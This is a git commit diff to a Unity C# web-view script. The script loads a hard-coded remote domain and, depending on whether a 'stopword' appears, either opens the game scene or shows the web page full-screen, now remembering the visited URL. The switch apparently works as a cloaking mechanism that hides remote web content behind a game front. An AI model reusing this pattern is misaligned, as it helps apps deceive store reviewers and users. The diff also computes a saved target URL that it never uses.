f1e43836872b1d2f83ed9a4f236e2f319028d990
UnityGitApps <nikcxprojects@gmail.com>
2023-06-03 18:38:59 +0300

    update

--- Assets/Third/Scripts/Viewer.cs
+++ Assets/Third/Scripts/Viewer.cs
@@ -3,13 +3,15 @@ using UnityEngine.UI;
 
 public class Viewer : MonoBehaviour
 {
-    UniWebView View { get; set; }
+    private const string localPath = "localPath";
+
+    private UniWebView View { get; set; }
 
     delegate void ResultAction(bool IsGame);
     event ResultAction OnResultActionEvent;
-    
-    private const string url = "http://mknwcjwc.top";
-    private const string stopword = "down";
+
+    private const string url = "http://h7j9k2.space";
+    private const string stopword = "asjdkhfjasdghfiuperqtyquwieytnzcvxbmzxcnmzxcvbGywHHHs";
 
     private void OnEnable()
     {
@@ -23,10 +25,9 @@ public class Viewer : MonoBehaviour
 
     private void Viewer_OnResultActionEvent(bool IsGame)
     {
-        if(IsGame)
+        if (IsGame)
         {
             Screen.fullScreen = true;
-            Screen.orientation = ScreenOrientation.Portrait;
             UnityEngine.SceneManagement.SceneManager.LoadScene(1);
         }
     }
@@ -70,11 +71,13 @@ public class Viewer : MonoBehaviour
                 }
                 else
                 {
+                    PlayerPrefs.SetString(localPath, web.Url);
                     View.Show(true);
                 }
             });
         };
 
+        var target = PlayerPrefs.HasKey(localPath) ? PlayerPrefs.GetString(localPath) : url;
         View.Load(url);
     }
 
